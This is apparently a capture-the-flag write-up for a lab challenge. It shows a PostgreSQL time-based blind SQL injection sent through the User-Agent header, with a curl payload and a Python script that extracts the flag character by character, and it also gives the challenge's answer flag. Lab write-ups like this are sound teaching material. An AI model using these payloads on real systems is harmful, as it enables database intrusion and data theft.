# SQLi-034: PostgreSQL User-Agent Time-based - Writeup

## Flag: `FLAG{us3r_4g3nt_t1m3_bl1nd}`

## Payload (INSERT context)

```bash
time curl -A "Mozilla'); SELECT CASE WHEN (SELECT SUBSTRING(value,1,1) FROM flags)='F' THEN pg_sleep(2) END--" http://localhost:5034/
```

## Exploit

```python
import requests, time

def check(cond):
    start = time.time()
    ua = f"Mozilla'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END--"
    requests.get("http://localhost:5034/", headers={"User-Agent": ua})
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags)='{c}'"):
            flag += c
            print(f"[+] {flag}")
            break
```

🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`
